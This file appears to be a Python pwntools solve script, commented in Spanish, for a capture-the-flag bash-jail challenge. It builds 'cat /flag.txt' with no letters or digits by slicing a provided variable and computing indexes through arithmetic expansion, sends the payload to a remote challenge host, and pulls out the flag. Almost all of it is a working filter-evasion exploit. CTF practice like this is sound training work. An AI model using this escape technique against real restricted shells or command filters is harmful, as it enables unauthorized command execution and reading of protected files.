#!/usr/bin/env python3
"""
Muted-Deaf-Prision — Solve script
Bash jail escape: construir 'cat /flag.txt' sin caracteres alfanuméricos ni '>'

La jail proporciona $__ con todos los caracteres alfanuméricos.
Extraemos chars con ${__:pos:len} y generamos los índices aritméticamente.
"""
from pwn import *

HOST = "0.cloud.chals.io"
PORT = 31351

# Payload: construye "cat /flag.txt" sin usar [a-zA-Z0-9] ni ">"
# $__ = "abcdefghijklmnopqrsleeptuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}?-#"
# Posiciones: c=2, a=0, t=23, f=5, l=11, g=6, x=27
#
# Variables numéricas (solo underscores):
#   ___ = 1    $((-~$(())))
#   ____ = 2   $((___+___))
#   _____ = 3  $((____+___))
#   ______ = 4 $((____+____))
#   _______ = 5 $((_____+____))
#
# Posiciones calculadas:
#   0  = $(())
#   2  = ____
#   5  = _______
#   6  = _______+___
#   11 = ______+______+_____  (4+4+3)
#   23 = ______*_______+_____ (4*5+3)
#   27 = _______*_______+____ (5*5+2)

payload = (
    '___=$((-~$(())))  ;'
    '____=$((___+___));'
    '_____=$((____+___));'
    '______=$((____+____));'
    '_______=$((_____+____));'
    # cat
    '${__:____:___}'                          # c (pos 2)
    '${__:$(()):___}'                         # a (pos 0)
    '${__:$((______*_______+_____)):___}'     # t (pos 23)
    ' /'                                      # espacio + /
    # flag.txt
    '${__:_______:___}'                       # f (pos 5)
    '${__:$((______+______+_____)):___}'      # l (pos 11)
    '${__:$(()):___}'                         # a (pos 0)
    '${__:$((_______+___)):___}'              # g (pos 6)
    '.'                                       # .
    '${__:$((______*_______+_____)):___}'     # t (pos 23)
    '${__:$((_______*_______+____)):___}'     # x (pos 27)
    '${__:$((______*_______+_____)):___}'     # t (pos 23)
)

log.info(f"Payload ({len(payload)} bytes): {payload}")

r = remote(HOST, PORT)
# Esperar el prompt
r.recvuntil(b">> ")
log.info("Prompt recibido, enviando payload...")
r.sendline(payload.encode())

# Recibir la respuesta
try:
    data = r.recvall(timeout=10).decode(errors='replace')
    print(data)
    # Buscar la flag
    import re
    flags = re.findall(r'HackOn\{[^}]+\}', data)
    if flags:
        flag = flags[0]
        log.success(f"FLAG: {flag}")
        with open("/home/ubuntu/hackon_ctf/misc/Muted-Deaf-Prision/flag.txt", "w") as f:
            f.write(flag + "\n")
    else:
        log.warning("Flag no encontrada en la respuesta")
except Exception as e:
    log.error(f"Error: {e}")
finally:
    r.close()
